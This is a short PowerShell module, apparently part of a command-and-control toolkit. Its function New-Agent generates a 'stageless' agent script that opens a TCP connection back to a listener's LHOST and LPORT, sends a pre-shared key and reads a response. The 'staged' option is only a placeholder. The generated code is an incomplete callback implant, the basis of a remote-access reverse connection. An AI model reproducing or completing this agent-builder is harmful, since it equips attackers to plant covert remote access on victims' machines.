#
# New_Agent.psm1
#
Function Global:New-Agent()
{
    [CmdletBinding()]
    param
    (
		[Parameter()]
		[PSCustomObject]$Listerner,

		[Parameter()]
		[ValidateSet("Staged","Stageless")]
		[String]$StageType


    )


	Process
	{
		
		if($StageType -eq "Staged")
		{
			"Oneliner here"
		}

		if($StageType -eq "Stageless")
		{
				$PSK   = $Listerner.PSK
				$LHOST = $Listerner.LHOST
				$LPORT = $Listerner.LPORT

				$Agent = @(
					"`$PSK = $PSK"
					"`$tcp = New-Object System.Net.Sockets.TcpClient;" 
					"`$tcp.connect($LHOST, $LPORT);"

					"`$tcpStream = `$tcp.GetStream()"
					"`$reader = New-Object System.IO.StreamReader(`$tcpStream)"
					"`$writer = New-Object System.IO.StreamWriter(`$tcpStream)"
					"`$writer.WriteLine(`$PSK);"
					"`$reader.ReadLine()"
					) -join "`r`n"
			
			return $Agent
		}
		
	}
		

 }	